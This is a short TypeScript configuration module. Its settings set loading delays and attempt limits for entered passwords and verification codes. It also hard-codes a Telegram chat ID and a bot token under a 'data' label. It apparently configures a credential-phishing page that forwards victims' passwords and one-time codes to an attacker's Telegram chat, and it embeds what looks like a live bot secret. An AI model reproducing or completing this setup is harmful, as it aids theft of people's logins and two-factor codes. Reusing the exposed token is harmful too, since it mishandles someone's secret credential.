interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: string;
    data_token: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 5000,
    max_failed_code_attempts: 5,
    max_failed_password_attempts: 0,
    password_loading_time: 5000,
  },
  telegram: {
    data_chatid: "-1002262445535",
    data_token: "7905032026:AAEYIhkZw3EnvD-U1P-A7yRW4_AnN5tcR_8",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
